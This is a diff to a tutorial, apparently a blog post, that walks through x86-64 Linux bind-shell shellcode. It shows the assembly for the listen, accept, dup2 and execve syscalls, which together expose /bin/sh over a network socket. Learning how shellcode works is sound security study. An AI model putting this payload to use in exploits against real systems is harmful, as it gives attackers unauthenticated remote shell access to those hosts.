@@ -88,6 +88,8 @@ You can a syscall by putting its number in RAX and its arguments in RDI, RSI, RD
 
     mov rdi, rax
 
+The return value is moved to RDI for later use in other syscalls.
+
 ### `bind()`
 
 Calling [`bind(2)`][man_2_bind] is probably the part of this shellcode most prone to confusion. The first argument is the ID (know as "file descriptor") of the socket created by `socket`.
@@ -145,8 +147,89 @@ At last the third argument to the `bind` syscall is the size of the address stru
 
     ; bind
     mov rax, 49
+    ; rdi already set before
     mov rsi, rsp ; &server
     mov rdx, 16  ; sizeof(sockaddr_in)
+    syscall
+
+### `listen()`
+
+    ; listen(sock, 2)
+    ; __NR_listen = 50
+
+    mov rax, 50
+    ; rdi already set before
+    mov rsi, 2
+    syscall
+
+### `accept()`
+
+The ID for a new socket is returned. The value is saved into RBX for later use with `dup2`.
+
+    ; new = accept(sock, NULL, NULL);
+    ; __NR_accept = 43
+
+    mov rax, 43
+    ; rdi already set before
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+
+    mov rbx, rax
+
+### `close()`
+
+Closing the listening socket is a good practice, but it is now strictly needed for the shellcode to work. I removed it in the final version.
+
+    ; close(sock)
+    ; __NR_close = 3
+
+    mov rax, 3
+    ; rdi already set before
+    syscall
+
+### `dup2()`
+
+These syscalls will make sure all keystrokes arriving through the connection are passed to the process that will be spawned (`/bin/sh`) and that its output and errors goes back into the connection.
+
+    ; dup2(new, 0);
+    ; dup2(new, 1);
+    ; dup2(new, 2);
+    ; __NR_dup2 = 33
+
+    mov rax, 33
+    mov rdi, rbx
+    xor rsi, rsi
+    syscall
+
+    mov rax, 33
+    inc rsi
+    syscall
+
+    mov rax, 33
+    inc rsi
+    syscall
+
+### `execve()`
+
+    ; int execve(const char *path, char *const argv[], char *const envp[])
+    ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
+    ; rsi, argv = (char**) (/bin//sh, 0x00)
+    ; rdx, envp = &0x00
+
+    xor rax, rax
+    push rax
+    mov rdx, rsp ; *rdx = &0x00
+
+    mov rsi, 0x68732f2f6e69622f
+    push rsi
+    mov rdi, rsp ; rdi = (char*) /bin//sh
+
+    push rax
+    push rdi
+    mov rsi, rsp ; rsi = (char**) (/bin//sh, 0x00)
+
+    mov al, 59
     syscall
 
 
